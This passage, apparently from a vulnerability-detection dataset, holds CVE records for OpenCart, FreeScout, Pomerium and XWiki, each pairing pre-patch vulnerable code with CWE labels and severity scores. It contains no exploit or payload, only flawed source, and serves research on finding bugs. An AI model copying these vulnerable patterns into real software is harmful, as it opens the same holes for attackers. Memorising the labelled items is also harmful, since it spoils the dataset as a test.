$this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}\n\n\t/**\n\t * Login\n\t *\n\t * @return void\n\t */\n\tpublic function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}",
        "public function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 54,
          "content": "\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {"
        },
        {
          "line_no": 55,
          "content": "\t\t\t$args = $this->request->get;"
        },
        {
          "line_no": 57,
          "content": "\t\t\t$route = $args['route'];"
        },
        {
          "line_no": 59,
          "content": "\t\t\tunset($args['route']);"
        },
        {
          "line_no": 60,
          "content": "\t\t\tunset($args['user_token']);"
        },
        {
          "line_no": 62,
          "content": "\t\t\t$url = '';"
        },
        {
          "line_no": 64,
          "content": "\t\t\t$url .= http_build_query($args);"
        },
        {
          "line_no": 66,
          "content": "\t\t\t$data['redirect'] = $this->url->link($route, $url);"
        },
        {
          "line_no": 67,
          "content": "\t\t} else {"
        },
        {
          "line_no": 68,
          "content": "\t\t\t$data['redirect'] = '';"
        },
        {
          "line_no": 69,
          "content": "\t\t}"
        },
        {
          "line_no": 129,
          "content": "\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {"
        },
        {
          "line_no": 130,
          "content": "\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];"
        },
        {
          "line_no": 131,
          "content": "\t\t\t} else {"
        },
        {
          "line_no": 132,
          "content": "\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);"
        },
        {
          "line_no": 133,
          "content": "\t\t\t}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "LOW",
    "cvss_score": 2.1,
    "cvss_version": 4.0
  },
  {
    "id": 161,
    "cve": "CVE-2025-48474",
    "description": "FreeScout is a free self-hosted help desk and shared mailbox. Prior to version 1.8.180, the application incorrectly checks user access rights for conversations. Users with show_only_assigned_conversations enabled can assign themselves to an arbitrary conversation from the mailbox to which they have access, thereby bypassing the restriction on viewing conversations. This issue has been patched in version 1.8.180.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Policies/ConversationPolicy.php",
          "content": "<?php\n\nnamespace App\\Policies;\n\nuse App\\Conversation;\nuse App\\Mailbox;\nuse App\\User;\nuse Illuminate\\Auth\\Access\\HandlesAuthorization;\n\nclass ConversationPolicy\n{\n    use HandlesAuthorization;\n\n    /**\n     * Determine whether the user can view the conversation.\n     *\n     * @param \\App\\User         $user\n     * @param \\App\\Conversation $conversation\n     *\n     * @return bool\n     */\n    public function view(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users->contains($user)) {\n                // Maybe user can see only assigned conversations.\n                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)\n                    && $conversation->created_by_user_id != $user->id\n                    && $user->canSeeOnlyAssignedConversations()\n                ) {\n                    return false;\n                } else {\n                    return true;\n                }\n            } else {\n                return false;\n            }\n        }\n    }\n\n    /**\n     * Cached version.\n     * \n     * @param  User         $user         [description]\n     * @param  Conversation $conversation [description]\n     * @return [type]                     [description]\n     */\n    public function viewCached(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users_cached->contains($user)) {\n                // Maybe user can see only assigned conversations.\n                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)\n                    && $conversation->created_by_user_id != $user->id\n                    && $user->canSeeOnlyAssignedConversations()\n                ) {\n                    return false;\n                } else {\n                    return true;\n                }\n            } else {\n                return false;\n            }\n        }\n    }\n\n    /**\n     * Determine whether the user can update the conversation.\n     *\n     * @param \\App\\User         $user\n     * @param \\App\\Conversation $conversation\n     *\n     * @return bool\n     */\n    public function update(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users->contains($user)) {\n                return true;\n            } else {\n                return false;\n            }\n        }\n    }\n\n    /**\n     * Check if user can delete conversation.\n     */\n    public function delete(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            return $user->hasPermission(User::PERM_DELETE_CONVERSATIONS);\n        }\n    }\n\n    /**\n     * Determine whether current user can move conversations\n     *\n     * @param \\App\\User    $user\n     * @param \\App\\Mailbox $mailbox\n     *\n     * @return mixed\n     */\n    public function move(User $user)\n    {\n        // First check this, because it is cached in conversation page\n        if (count($user->mailboxesCanView(true)) > 1) {\n            return true;\n        }\n        return Mailbox::count() > 1;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function view(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users->contains($user)) {\n                // Maybe user can see only assigned conversations.\n                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)\n                    && $conversation->created_by_user_id != $user->id\n                    && $user->canSeeOnlyAssignedConversations()\n                ) {\n                    return false;\n                } else {\n                    return true;\n                }\n            } else {\n                return false;\n            }\n        }\n    }",
        "public function viewCached(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users_cached->contains($user)) {\n                // Maybe user can see only assigned conversations.\n                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)\n                    && $conversation->created_by_user_id != $user->id\n                    && $user->canSeeOnlyAssignedConversations()\n                ) {\n                    return false;\n                } else {\n                    return true;\n                }\n            } else {\n                return false;\n            }\n        }\n    }",
        "public function update(User $user, Conversation $conversation)\n    {\n        if ($user->isAdmin()) {\n            return true;\n        } else {\n            if ($conversation->mailbox->users->contains($user)) {\n                return true;\n            } else {\n                return false;\n            }\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 29,
          "content": "                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)"
        },
        {
          "line_no": 30,
          "content": "                    && $conversation->created_by_user_id != $user->id"
        },
        {
          "line_no": 31,
          "content": "                    && $user->canSeeOnlyAssignedConversations()"
        },
        {
          "line_no": 32,
          "content": "                ) {"
        },
        {
          "line_no": 33,
          "content": "                    return false;"
        },
        {
          "line_no": 34,
          "content": "                } else {"
        },
        {
          "line_no": 35,
          "content": "                    return true;"
        },
        {
          "line_no": 36,
          "content": "                }"
        },
        {
          "line_no": 57,
          "content": "                if (!\\Eventy::filter('conversation.is_user_assignee', $conversation->user_id == $user->id, $conversation, $user->id)"
        },
        {
          "line_no": 58,
          "content": "                    && $conversation->created_by_user_id != $user->id"
        },
        {
          "line_no": 59,
          "content": "                    && $user->canSeeOnlyAssignedConversations()"
        },
        {
          "line_no": 60,
          "content": "                ) {"
        },
        {
          "line_no": 61,
          "content": "                    return false;"
        },
        {
          "line_no": 62,
          "content": "                } else {"
        },
        {
          "line_no": 63,
          "content": "                    return true;"
        },
        {
          "line_no": 64,
          "content": "                }"
        },
        {
          "line_no": 85,
          "content": "                return true;"
        }
      ]
    },
    "cwe": [
      "CWE-863"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 909,
    "cve": "CVE-2024-39315",
    "description": "Pomerium is an identity and context-aware access proxy. Prior to version 0.26.1, the Pomerium user info page (at `/.pomerium`) unintentionally included serialized OAuth2 access and ID tokens from the logged-in user's session. These tokens are not intended to be exposed to end users. This issue may be more severe in the presence of a cross-site scripting vulnerability in an upstream application proxied through Pomerium. If an attacker could insert a malicious script onto a web page proxied through Pomerium, that script could access these tokens by making a request to the `/.pomerium` endpoint. Upstream applications that authenticate only the ID token may be vulnerable to user impersonation using a token obtained in this manner. Note that an OAuth2 access token or ID token by itself is not sufficient to hijack a user's Pomerium session. Upstream applications should not be vulnerable to user impersonation via these tokens provided the application verifies the Pomerium JWT for each request, the connection between Pomerium and the application is secured by mTLS, or the connection between Pomerium and the application is otherwise secured at the network layer. The issue is patched in Pomerium v0.26.1. No known workarounds are available.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/handlers/userinfo.go",
          "content": "package handlers\n\nimport (\n\t\"encoding/json\"\n\t\"net/http\"\n\n\t\"google.golang.org/protobuf/encoding/protojson\"\n\n\t\"github.com/pomerium/datasource/pkg/directory\"\n\t\"github.com/pomerium/pomerium/internal/httputil\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/identity\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/session\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/user\"\n\t\"github.com/pomerium/pomerium/ui\"\n\t\"github.com/pomerium/webauthn\"\n)\n\n// UserInfoData is the data for the UserInfo page.\ntype UserInfoData struct {\n\tCSRFToken      string\n\tIsImpersonated bool\n\tSession        *session.Session\n\tUser           *user.User\n\tProfile        *identity.Profile\n\n\tIsEnterprise    bool\n\tDirectoryUser   *directory.User\n\tDirectoryGroups []*directory.Group\n\n\tWebAuthnCreationOptions *webauthn.PublicKeyCredentialCreationOptions\n\tWebAuthnRequestOptions  *webauthn.PublicKeyCredentialRequestOptions\n\tWebAuthnURL             string\n\n\tBrandingOptions httputil.BrandingOptions\n}\n\n// ToJSON converts the data into a JSON map.\nfunc (data UserInfoData) ToJSON() map[string]any {\n\tm := map[string]any{}\n\tm[\"csrfToken\"] = data.CSRFToken\n\tm[\"isImpersonated\"] = data.IsImpersonated\n\tif bs, err := protojson.Marshal(data.Session); err == nil {\n\t\tm[\"session\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.User); err == nil {\n\t\tm[\"user\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.Profile); err == nil {\n\t\tm[\"profile\"] = json.RawMessage(bs)\n\t}\n\tm[\"isEnterprise\"] = data.IsEnterprise\n\tif data.DirectoryUser != nil {\n\t\tm[\"directoryUser\"] = data.DirectoryUser\n\t}\n\tif len(data.DirectoryGroups) > 0 {\n\t\tm[\"directoryGroups\"] = data.DirectoryGroups\n\t}\n\tm[\"webAuthnCreationOptions\"] = data.WebAuthnCreationOptions\n\tm[\"webAuthnRequestOptions\"] = data.WebAuthnRequestOptions\n\tm[\"webAuthnUrl\"] = data.WebAuthnURL\n\thttputil.AddBrandingOptionsToMap(m, data.BrandingOptions)\n\treturn m\n}\n\n// UserInfo returns a handler that renders the user info page.\nfunc UserInfo(data UserInfoData) http.Handler {\n\treturn httputil.HandlerFunc(func(w http.ResponseWriter, r *http.Request) error {\n\t\treturn ui.ServePage(w, r, \"UserInfo\", \"User Info Dashboard\", data.ToJSON())\n\t})\n}\n"
        }
      ],
      "method_level": [
        "func (data UserInfoData) ToJSON() map[string]any {\n\tm := map[string]any{}\n\tm[\"csrfToken\"] = data.CSRFToken\n\tm[\"isImpersonated\"] = data.IsImpersonated\n\tif bs, err := protojson.Marshal(data.Session); err == nil {\n\t\tm[\"session\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.User); err == nil {\n\t\tm[\"user\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.Profile); err == nil {\n\t\tm[\"profile\"] = json.RawMessage(bs)\n\t}\n\tm[\"isEnterprise\"] = data.IsEnterprise\n\tif data.DirectoryUser != nil {\n\t\tm[\"directoryUser\"] = data.DirectoryUser\n\t}\n\tif len(data.DirectoryGroups) > 0 {\n\t\tm[\"directoryGroups\"] = data.DirectoryGroups\n\t}\n\tm[\"webAuthnCreationOptions\"] = data.WebAuthnCreationOptions\n\tm[\"webAuthnRequestOptions\"] = data.WebAuthnRequestOptions\n\tm[\"webAuthnUrl\"] = data.WebAuthnURL\n\thttputil.AddBrandingOptionsToMap(m, data.BrandingOptions)\n\treturn m\n}"
      ],
      "hunk_level": [
        {
          "line_no": 42,
          "content": "\tif bs, err := protojson.Marshal(data.Session); err == nil {"
        },
        {
          "line_no": 43,
          "content": "\t\tm[\"session\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 44,
          "content": "\t}"
        },
        {
          "line_no": 45,
          "content": "\tif bs, err := protojson.Marshal(data.User); err == nil {"
        },
        {
          "line_no": 46,
          "content": "\t\tm[\"user\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 47,
          "content": "\t}"
        },
        {
          "line_no": 48,
          "content": "\tif bs, err := protojson.Marshal(data.Profile); err == nil {"
        },
        {
          "line_no": 49,
          "content": "\t\tm[\"profile\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 50,
          "content": "\t}"
        }
      ]
    },
    "cwe": [
      "CWE-201"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.7,
    "cvss_version": 3.1
  },
  {
    "id": 620,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        